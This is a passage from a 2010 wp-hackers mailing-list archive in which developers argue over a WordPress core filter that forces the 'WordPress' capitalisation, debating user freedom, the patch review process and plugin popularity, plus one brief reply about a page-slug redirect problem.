> the filter and your perceived attitude toward those who are asking for the 
> filter's removal.
> 
> As for your justification for this function's inclusion in core: I find it 
> somewhat hypocritical with respect to the stated philosophy of WordPress to be 
> Free Software. May I remind you of this statement, which is part of GNU's 
> definition of free software:
> 
> "The freedom to run the program means the freedom for any kind of person or 
> organization to use it on any kind of computer system, for any kind of overall 
> job and purpose, without being required to communicate about it with the 
> developer or any other specific entity. In this freedom, it is the user's 
> purpose that matters, not the developer's purpose; you as a user are free to 
> run the program for your purposes, and if you distribute it to someone else, 
> she is then free to run it for her purposes, but you are not entitled to 
> impose your purposes on her."
> 
> Reiterating:
> 
> "it is the user's purpose that matters, not the developer's purpose"
> 
> By imposing on end users your purpose - regardless of how noble - of 
> correctly spelling "WordPress" you are violating the very freedoms you 
> espouse.
> 
> (And no: this issue has nothing whatsoever to do with protection or violation 
> of trademark.)
> 
> Saying that the imposition can be easily changed with a two-line plugin is 
> entirely irrelevant for the vast majority of users who do not have the 
> technical competence to write such a plugin. Adding a plugin to Extend is a 
> poor man's alternative to what is the only (technically and philosophically) 
> right course of action: if the function must be in core, expose a 
> configuration and set it to disabled by default.
> 
> As for the function itself: I find it difficult to reconcile adding such a 
> frivolous function to core, given the general philosophy of keeping so much 
> out of core. As such, its inclusion appears to be incredibly pedantic.
> 
> This function should have been written as a plugin from the very beginning. 
> Bundle it with core if you must (surely it is - at a minimum - more useful 
> than Hello Dolly, after all).
> 
> But it is less the function itself, and more the attitude in response to those 
> calling for its change/removal, that concerns me - and that prompts me to 
> respond.
> 
> Matt, it is your attitude - in turns arrogant, condescending, dismissive, and 
> snide - that is exacerbating the situation. You are the one who is 
> needlessly increasing the emotional appeal in this matter.
> 
> Can I suggest that perhaps this issue is best discussed devoid of snide, 
> arrogant, and dismissive remarks (from all parties)?
> 
> As for me: what concerns me most is the "slippery slope" consideration of the 
> core development team's response to community outcry regarding this function 
> being added to core. How does the decision to add this function to core (and 
> the response to the community) in any way indicative of concern or respect for 
> the needs, desires, and *freedoms* of the WordPress community?
> 
> -- 
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
> 
> On Tuesday 06 July 2010 12:39:33 pm Matt Mullenweg wrote:
>> On 7/6/2010 1:30 PM, eric at eamann.com wrote:
>>> Some time ago I wrote a patch in response to a user's request that we add
>>> Skype and Facebook and LinkedIn and other fields to the profile page ...
>>> it was rejected because "There's a filter there, which means a plugin
>>> can easily control all of this." (ticket #11367)  It makes sense that we
>>> not include additional (trivial) functionality like this into core ...
>>> it made sense there and it still makes sense now.
>> 
>> For what it's worth, I think it would be nice to modernize those fields,
>> and even go a step further to authenticate them where possible. I would
>> have said so if I had seen that ticket.
>> 
>>> It doesn't paint a pretty picture of the core teams' opinion of the rest
>>> of the community ...
>> 
>> One of the core tenets of Open Source development is that people can
>> disagree, strongly, but still respect each other.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mccormicky at gmail.com  Tue Jul  6 19:24:08 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 6 Jul 2010 15:24:08 -0400
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
	<AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
Message-ID: <AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv@mail.gmail.com>

Oh whatever. They can talk about P for 4 days but someone can't help someone
else.
It isn't WordPress and it is not a bug.
You're confusing your server.

Page Title: Experience Tuscany
Page Slug:  experience-tuscany
Domain: thriftytuscany.com
Sub-Domain: experience-tuscany
URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany

If you make the slug different than experience-tuscany you won't get a 404








On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com> wrote:

> On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
> > I installed 3.0 and after creating a new page, additional to those I
> > already had prior to the upgrade to 3.0, my homepage redirects to that
> > newly created page with a 301 permanent redirect. If I delete the page
> > the redirect stays and produces a 404 error each time I try to visit
> > the homepage. To eliminate the error I have to go in the DB and delete
> > the 301 entry.
>
> This list is not a support list.
>
> You have a problem with Redirects.  Do you have any redirection
> plugins installed?  Have you tried looking through the source of your
> plugins to find mentions of the wp_redirection_items and
> wp_redirection_modules tables (these are not core tables)?
>
> My guess is that this is a problem with Urban Giraffe's Redirection
> plugin http://urbangiraffe.com/plugins/redirection/  Do you have that
> plugin installed? If you disable the plugin, does the problem go away
> (always a good debugging step).
>
> Here's a link which addresses what sounds like your problem.
>
>
> http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-another-wp-page-without-my-instruction-to-do-so
>
> If it is this plugin that's causing the problem, I suggest you move
> your discussion to those support forums as the people there will be
> able to help you better.  If they can fix your problem, please also
> post a note on your WordPress.org forums thread so that people
> searching that site can get the answer they need.
>
> Please also direct future support inquiries to the proper channels.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chip at chipbennett.net  Tue Jul  6 19:40:58 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Tue, 6 Jul 2010 14:40:58 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
Message-ID: <201007061440.59637.chip@chipbennett.net>

Oh, silly me!

There already *is* such a plugin. It's been in the repository for almost three 
years:

http://wordpress.org/extend/plugins/ozhs-correctly-spell-wordpress/

It has a grand total of (wait for it...)

*334 downloads*

So, Matt, tell us again: just how vital and popular is this core change?

-- 
Chip Bennett
chip at chipbennett.net
www.chipbennett.net

On Tuesday 06 July 2010 1:34:09 pm Gavin Pearce wrote:
> +1 :)
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
> Bennett
> Sent: 06 July 2010 19:29
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
> 
> How about moving the entire function itself into a plugin, and see how
> many
> downloads *it* gets?
> 
> > On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > > I wrote a patch weeks ago to take it out. I'm really not trying to
> 
> be
> 
> > > difficult! I just think this filter is a terrible idea. And it's a
> > > little sad to witness the total lack of interest from the core team.
> > > This isn't how it's supposed to work, IMO.
> > 
> > Maybe write and promote a plugin, and we can see how many downloads it
> > gets?
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ravi-lists at g8o.net  Tue Jul  6 19:50:18 2010
From: ravi-lists at g8o.net ( ravi )
Date: Tue, 6 Jul 2010 15:50:18 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<4C336A55.6080803@mullenweg.com>
	<AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
Message-ID: <D8BE3654-A78E-4400-BF1A-48BFCF21CE13@g8o.net>

On Jul 6, 2010, at 2:14 PM, Christopher O'Connell wrote:
> As
> the Wall Stree Journal states in their editorial philosophy
> 
> [We stand] against ... the ukases of kings and other collectivists; and for
> individual autonomy against dictators, bullies and even the tempers of
> momentary majorities.

That?s rich. I hope WordPress (or Wordpress) never adopts any philosophy associated with the Wall Street Journal, not especially one which includes the phrase ?kings and other collectivists?.

Much better ?quick consensus and running code?.

	?ravi


From dennen at gmail.com  Tue Jul  6 19:50:23 2010
From: dennen at gmail.com (Bill Dennen)
Date: Tue, 6 Jul 2010 15:50:23 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061440.59637.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
Message-ID: <AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>

This has been a fascinating discussion to follow.

My two cents --

It's one thing for the WordPress devs to make sure that THEY spell the
word "WordPress" properly in all of their documentation and interface
elements.

However, having the software itself correct user input in this way
seems to cross a line, especially if there is no simple on/off switch
for users to flip.

It's sort of like the "Convert emoticons like :-) and :-P to graphics
on display" option that is in Settings->Writing. If there is an option
for the emoticons, why wouldn't there be one for WordPress? (One could
argue that neither one should be in core, of course.)

Cheers-
Bill

From mitch at studionashvegas.com  Tue Jul  6 19:54:02 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Tue, 6 Jul 2010 14:54:02 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>
Message-ID: <AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>

+1 for the emoticons - that's a very good way to look at it.

1) both are cosmetic
2) both do alter the content in some reasonable fashion
3) one has an option - why shouldn't the other?

I posted something on my personal blog about this as well.  It'd be
nice to get some community input and I can weave the responses into
the discussion if any good ones come up.

Mitch
http://www.mitchcanter.com
http://www.studionashvegas.com

On Tue, Jul 6, 2010 at 2:50 PM, Bill Dennen <dennen at gmail.com> wrote:
> This has been a fascinating discussion to follow.
>
> My two cents --
>
> It's one thing for the WordPress devs to make sure that THEY spell the
> word "WordPress" properly in all of their documentation and interface
> elements.
>
> However, having the software itself correct user input in this way
> seems to cross a line, especially if there is no simple on/off switch
> for users to flip.
>
> It's sort of like the "Convert emoticons like :-) and :-P to graphics
> on display" option that is in Settings->Writing. If there is an option
> for the emoticons, why wouldn't there be one for WordPress? (One could
> argue that neither one should be in core, of course.)
>
> Cheers-
> Bill
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From curtis at curtismchale.ca  Tue Jul  6 19:33:28 2010
From: curtis at curtismchale.ca (Curtis Work)
Date: Tue, 6 Jul 2010 12:33:28 -0700
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061329.26694.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
Message-ID: <EFCAE8ED-5E27-4B12-9BE1-05AAA47BBAA3@curtismchale.ca>

That would have my vote. Honestly though it doesn't seem like there is any  support from the core team. They decided and the rest of us have to deal. 

Sorry if I missed support from core team members. 

Curtis McHale
Http://www.curtismchale.com
604.751.3482

On 2010-07-06, at 11:29 AM, Chip Bennett <chip at chipbennett.net> wrote:

> How about moving the entire function itself into a plugin, and see how many 
> downloads *it* gets?
> 
> -- 
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
> 
> On Tuesday 06 July 2010 12:20:17 pm Matt Mullenweg wrote:
>> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
>>> I wrote a patch weeks ago to take it out. I'm really not trying to be
>>> difficult! I just think this filter is a terrible idea. And it's a
>>> little sad to witness the total lack of interest from the core team.
>>> This isn't how it's supposed to work, IMO.
>> 
>> Maybe write and promote a plugin, and we can see how many downloads it
>> gets?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From curtis at curtismchale.ca  Tue Jul  6 19:33:28 2010
From: curtis at curtismchale.ca (Curtis Work)
Date: Tue, 6 Jul 2010 12:33:28 -0700
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061329.26694.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
Message-ID: <EFCAE8ED-5E27-4B12-9BE1-05AAA47BBAA3@curtismchale.ca>

That would have my vote. Honestly though it doesn't seem like there is any  support from the core team. They decided and the rest of us have to deal. 

Sorry if I missed support from core team members. 

Curtis McHale
Http://www.curtismchale.com
604.751.3482

On 2010-07-06, at 11:29 AM, Chip Bennett <chip at chipbennett.net> wrote:

> How about moving the entire function itself into a plugin, and see how many 
> downloads *it* gets?
> 
> -- 
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
> 
> On Tuesday 06 July 2010 12:20:17 pm Matt Mullenweg wrote:
>> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
>>> I wrote a patch weeks ago to take it out. I'm really not trying to be
>>> difficult! I just think this filter is a terrible idea. And it's a
>>> little sad to witness the total lack of interest from the core team.
>>> This isn't how it's supposed to work, IMO.
>> 
>> Maybe write and promote a plugin, and we can see how many downloads it
>> gets?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From eric at eamann.com  Tue Jul  6 20:12:49 2010
From: eric at eamann.com (eric at eamann.com)
Date: Tue, 6 Jul 2010 13:12:49 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061440.59637.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
Message-ID: <2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>

Unfortunately, this is where the conversation begins to derail. ?Let's try not
to make it a personal issue. ?We're facing three core problems here (that I've
seen at least):
?
1) WordPress has added a feature that modifies post content without input or
oversight from end users, many of whom are not technically skilled enough to
program or install a work-around. ?This is a question of perceived censorship
because the platform is now actively changing the words you originally wrote
without your permission. (Philosophically I see this as a large issue.)
?
2) Performance issues: Adding another filter slows down the processing engine.
?(In the short term this seems to be a minor issue.)
?
3) Standards and consistency: For a community member to submit code to core,
they must create a Trac ticket, submit a patch for discussion, possible tap a
core developer for feedback on IRC, and wait for several rounds of feedback
before it can be added (I'm talking feature additions, not bug fixes). ?In this
case, though, a core developer submitted a change to core code without the same
levels of discussion. ?(This presents a much larger issue.)
?
WordPress is a community project. ?It's used by the community, supported by the
community, and (allegedly) developed by the community. ?When the community is
required to submit to multiple layers of review, allowing core developers to
circumvent that system creates an environment of animosity (just read back
through this thread if you don't believe that). ?We begin attacking one another
on a personal level rather than opening discussing the issues and trying to
build a stronger community.
?
The fact of the matter is that this filter is a somewhat trivial issue. ?Did it
break a few sites? ?Yes, but any problems can be quickly fixed by a competent
developer and many of us are willing to help community members overcome problems
like this for free. ?Any upgrade can break a site, so this isn't a big surprise.
?
?
But did this patch follow the set standards for patch submission? ( see
http://codex.wordpress.org/User:HEngel/How_To_Become_A_WordPress_Developer or
http://codex.wordpress.org/Development_Planning) ?No. ?That's where I have the
biggest complaint.
?
The most resounding issue, though, is the lack of openness in discussions here
on the mailing list. ?It doesn't matter who you are or how you're affiliated
with the WordPress project, you can have an opinion. ?Further more, that opinion
can be wrong. ?That's what makes working on a project like this productive - you
voice your opinion, discuss it with the community, and come to a conclusion
about the best way forward. ?Your initial idea may or may not be the final
conclusion. ?
?
To forego this discussion before committing code, though, threatens to destroy
the process. ?Community members who thought themselves your equal now feel left
at the side of the road. ?Dismissing concerns out-of-hand only reinforces this
feeling and causes a minor issue (the entire patch was ~5 lines of code!) to
escalate to an emotional, major one (we've been debating this for how long?).
?
When new developers want to add a new feature to core, they're encouraged to
first build a plug-in and to see how popular it is with other users. ?If it's a
major improvement, someone will suggest it be added to core. ?In the case of
this particular patch, I can't see many people installing a plug-in to add just
this feature. ?Still, engaging the community *before* adding the patch would
still let everyone know about the feature and gauge its popularity.
?
Had we polled even just this list before, I have no doubt many of us would have
jumped on board. ?We didn't, and it's time to learn from that slight oversight
and move forward.
?
What non-core devs are seeing is a unilateral modification of code by core devs
without the approval process those same core devs require from the community.
?It has us up-in-arms about the patch, and struggling to grasp at an amicable
solution. ?
?
I'd like to suggest that we take a minute to cool down and think about what's
really at issue here. ?Are we upset about a patch? ?Are we upset about an
inconsistent commit process? ?Are we upset about the dichotomy between core and
non-core developers? ?Then, without insulting one another, injecting snide
remarks, or claiming that people can "vote with their feet" and leave a project
they love because of a ~5-line patch, let's figure out what we can learn through
this process and how we can avoid such a massive public backlash in the future.
?
For what it's worth, I'd like to see:
- This filter turned off (I'd rather write a plug-in to *add* a filter than
*remove* one)
- A clear, concise list of what steps *everyone* must follow when submitting a
patch to core
?
I don't know about everyone else, but I'd be more than happy with either or both
of those ...?
?
~Eric
?

On July 6, 2010 at 7:40 PM Chip Bennett <chip at chipbennett.net> wrote:

> Oh, silly me!
>
> There already *is* such a plugin. It's been in the repository for almost three
> years:
>
> http://wordpress.org/extend/plugins/ozhs-correctly-spell-wordpress/
>
> It has a grand total of (wait for it...)
>
> *334 downloads*
>
> So, Matt, tell us again: just how vital and popular is this core change?
>
> --
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
>
> On Tuesday 06 July 2010 1:34:09 pm Gavin Pearce wrote:
> > +1 :)
> >
> > -----Original Message-----
> > From: wp-hackers-bounces at lists.automattic.com
> > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
> > Bennett
> > Sent: 06 July 2010 19:29
> > To: wp-hackers at lists.automattic.com
> > Subject: Re: [wp-hackers] Putting the P in WordPress
> >
> > How about moving the entire function itself into a plugin, and see how
> > many
> > downloads *it* gets?
> >
> > > On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > > > I wrote a patch weeks ago to take it out. I'm really not trying to
> >
> > be
> >
> > > > difficult! I just think this filter is a terrible idea. And it's a
> > > > little sad to witness the total lack of interest from the core team.
> > > > This isn't how it's supposed to work, IMO.
> > >
> > > Maybe write and promote a plugin, and we can see how many downloads it
> > > gets?
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mark at simplercomputing.net  Tue Jul  6 20:28:41 2010
From: mark at simplercomputing.net (Mark E)
Date: Tue, 06 Jul 2010 14:28:41 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FC6@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>
	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de><4C336A55.6080803@mullenweg.com>	<AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC6@tbs-sbs01.TBS.local>
Message-ID: <4C3391F9.7010809@simplercomputing.net>



On 07/06/2010 12:32 PM, Gavin Pearce wrote:

> What do we *gain* with this function to make all Wordpress = WordPress,
> except for the added overhead and complications?

Sometimes people with a little bit of power get out of control because 
of ego and other personal problems - and it's always our fault for not 
seeing it their way.

Mark

From chip at chipbennett.net  Tue Jul  6 20:52:39 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Tue, 6 Jul 2010 15:52:39 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <201007061552.39703.chip@chipbennett.net>

While I admit that I might have added unnecessary snark into that reply* (and 
apologize for doing so), is the point invalid?

I wasn't the one to bring up the issue of popularity of a plugin as 
justification for decisions regarding core code; I believe Matt brought that 
up (in reference to determining whether to consider removing the filter from 
core, based on popularity of a plugin to remove the filter).

But, a plugin to *add* the filter has existed in the repository for three 
years, and has been woefully unpopular - it has generated only 334 downloads.

So, does that mean that if a plugin to remove the now-core filter exceeds the 
popularity of the extant plugin to add that filter, that the core filter will 
be removed, and left as plugin material?

Or should this really be left to a plugin popularity contest to begin with? I 
would suggest that the relative lack of popularity of Ozh' plugin is prima 
facie evidence that the functionality should never have been considered as 
core material in the first place.

* p.s. Snark: yes. Personal attacks: no. You'll find the former in my reply, 
but not the latter.

-- 
Chip Bennett
chip at chipbennett.net
www.chipbennett.net

On Tuesday 06 July 2010 3:12:49 pm eric at eamann.com wrote:
> Unfortunately, this is where the conversation begins to derail.  Let's try
> not to make it a personal issue.  We're facing three core problems here
> (that I've seen at least):
>  
> 1) WordPress has added a feature that modifies post content without input
> or oversight from end users, many of whom are not technically skilled
> enough to program or install a work-around.  This is a question of
> perceived censorship because the platform is now actively changing the
> words you originally wrote without your permission. (Philosophically I see
> this as a large issue.) 
> 2) Performance issues: Adding another filter slows down the processing
> engine. (In the short term this seems to be a minor issue.)
>  
> 3) Standards and consistency: For a community member to submit code to
> core, they must create a Trac ticket, submit a patch for discussion,
> possible tap a core developer for feedback on IRC, and wait for several
> rounds of feedback before it can be added (I'm talking feature additions,
> not bug fixes).  In this case, though, a core developer submitted a change
> to core code without the same levels of discussion.  (This presents a much
> larger issue.)
>  
> WordPress is a community project.  It's used by the community, supported by
> the community, and (allegedly) developed by the community.  When the
> community is required to submit to multiple layers of review, allowing
> core developers to circumvent that system creates an environment of
> animosity (just read back through this thread if you don't believe that).
>  We begin attacking one another on a personal level rather than opening
> discussing the issues and trying to build a stronger community.
>  
> The fact of the matter is that this filter is a somewhat trivial issue.
>  Did it break a few sites?  Yes, but any problems can be quickly fixed by
> a competent developer and many of us are willing to help community members
> overcome problems like this for free.  Any upgrade can break a site, so
> this isn't a big surprise. 
>  
> But did this patch follow the set standards for patch submission? ( see
> http://codex.wordpress.org/User:HEngel/How_To_Become_A_WordPress_Developer
> or http://codex.wordpress.org/Development_Planning)  No.  That's where I
> have the biggest complaint.
>  
> The most resounding issue, though, is the lack of openness in discussions
> here on the mailing list.  It doesn't matter who you are or how you're
> affiliated with the WordPress project, you can have an opinion.  Further
> more, that opinion can be wrong.  That's what makes working on a project
> like this productive - you voice your opinion, discuss it with the
> community, and come to a conclusion about the best way forward.  Your
> initial idea may or may not be the final conclusion.
>  
> To forego this discussion before committing code, though, threatens to
> destroy the process.  Community members who thought themselves your equal
> now feel left at the side of the road.  Dismissing concerns out-of-hand
> only reinforces this feeling and causes a minor issue (the entire patch
> was ~5 lines of code!) to escalate to an emotional, major one (we've been
> debating this for how long?). 
> When new developers want to add a new feature to core, they're encouraged
> to first build a plug-in and to see how popular it is with other users.
>  If it's a major improvement, someone will suggest it be added to core.
>  In the case of this particular patch, I can't see many people installing
> a plug-in to add just this feature.  Still, engaging the community
> *before* adding the patch would still let everyone know about the feature
> and gauge its popularity. 
> Had we polled even just this list before, I have no doubt many of us would
> have jumped on board.  We didn't, and it's time to learn from that slight
> oversight and move forward.
>  
> What non-core devs are seeing is a unilateral modification of code by core
> devs without the approval process those same core devs require from the
> community. It has us up-in-arms about the patch, and struggling to grasp
> at an amicable solution.
>  
> I'd like to suggest that we take a minute to cool down and think about
> what's really at issue here.  Are we upset about a patch?  Are we upset
> about an inconsistent commit process?  Are we upset about the dichotomy
> between core and non-core developers?  Then, without insulting one
> another, injecting snide remarks, or claiming that people can "vote with
> their feet" and leave a project they love because of a ~5-line patch,
> let's figure out what we can learn through this process and how we can
> avoid such a massive public backlash in the future. 
> For what it's worth, I'd like to see:
> - This filter turned off (I'd rather write a plug-in to *add* a filter than
> *remove* one)
> - A clear, concise list of what steps *everyone* must follow when
> submitting a patch to core
>  
> I don't know about everyone else, but I'd be more than happy with either or
> both of those ...
>  
> ~Eric
>  
> 
> On July 6, 2010 at 7:40 PM Chip Bennett <chip at chipbennett.net> wrote:
> > Oh, silly me!
> > 
> > There already *is* such a plugin. It's been in the repository for almost
> > three years:
> > 
> > http://wordpress.org/extend/plugins/ozhs-correctly-spell-wordpress/
> > 
> > It has a grand total of (wait for it...)
> > 
> > *334 downloads*
> > 
> > So, Matt, tell us again: just how vital and popular is this core change?
> > 
> > --
> > Chip Bennett
> > chip at chipbennett.net
> > www.chipbennett.net
> > 
> > On Tuesday 06 July 2010 1:34:09 pm Gavin Pearce wrote:
> > > +1 :)
> > > 
> > > -----Original Message-----
> > > From: wp-hackers-bounces at lists.automattic.com
> > > [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
> > > Bennett
> > > Sent: 06 July 2010 19:29
> > > To: wp-hackers at lists.automattic.com
> > > Subject: Re: [wp-hackers] Putting the P in WordPress
> > > 
> > > How about moving the entire function itself into a plugin, and see how
> > > many
> > > downloads *it* gets?
> > > 
> > > > On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > > > > I wrote a patch weeks ago to take it out. I'm really not trying to
> > > 
> > > be
> > > 
> > > > > difficult! I just think this filter is a terrible idea. And it's a
> > > > > little sad to witness the total lack of interest from the core
> > > > > team. This isn't how it's supposed to work, IMO.
> > > > 
> > > > Maybe write and promote a plugin, and we can see how many downloads
> > > > it gets?
> > > 
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > 
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From eric at eamann.com  Tue Jul  6 21:49:21 2010
From: eric at eamann.com (eric at eamann.com)
Date: Tue, 6 Jul 2010 14:49:21 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061552.39703.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061440.59637.chip@chipbennett.net>
